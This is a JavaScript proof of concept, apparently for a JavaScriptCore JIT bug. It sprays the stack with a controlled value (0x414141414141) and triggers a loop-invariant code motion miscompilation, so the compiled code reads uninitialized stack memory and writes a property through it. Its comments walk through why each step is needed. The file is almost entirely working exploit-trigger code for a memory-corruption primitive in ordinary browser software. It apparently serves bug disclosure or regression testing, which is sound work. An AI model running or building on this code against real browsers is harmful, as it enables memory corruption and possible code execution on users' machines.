    // Run with --useConcurrentJIT=false

    // Fill the stack with the return value of the provided function.
    function stackspray(f) {
        // This function will spill all the local variables to the stack
        // since they are needed for the returned array.
        let v0 = f(); let v1 = f(); let v2 = f(); let v3 = f();
        let v4 = f(); let v5 = f(); let v6 = f(); let v7 = f();
        return [v0, v1, v2, v3, v4, v5, v6, v7];
    }
    // JIT compile the stack spray.
    for (let i = 0; i < 1000; i++) {
        // call twice in different ways to prevent inlining.
        stackspray(() => 13.37);
        stackspray(() => {});
    }

    for (let v15 = 0; v15 < 100; v15++) {
        function v19(v23) {
            // This weird loop form might be required to prevent loop unrolling...
            for (let v30 = 0; v30 < 3; v30 = v30 + "asdf") {
                // Generates the specific CFG necessary to trigger the bug.
                const v33 = Error != Error;
                if (v33) {
                } else {
                    // Force a bailout.
                    // CFA will stop here and thus mark the following code as unreachable.
                    // Then, LICM will ignore the memory writes (e.g. initialization of stack slots)
                    // performed by the following code and will then move the memory reads (e.g.
                    // access to stack slots) above the loop, where they will, in fact, be executed.
                    const v34 = (1337)[-12345];
                }

                function v38(v41) {
                    // v41 is 8 bytes of uninitialized stack memory here, as
                    // (parts of) this code get moved before the loop as well.
                    return v41.hax = 42;
                }
                for (let v50 = 0; v50 < 10000; v50++) {
                    let o = {hax: 42};
                    const v51 = v38(o, ...arguments);
                }
            }
            // Force FTL compilation, probably.
            for (let v53 = 0; v53 < 1000000; v53++) {
            }
        }

        // Put controlled data onto the stack.
        stackspray(() => 3.54484805889626e-310);        // 0x414141414141 in binary
        // Call the miscompiled function.
        const v55 = v19(1337);
    }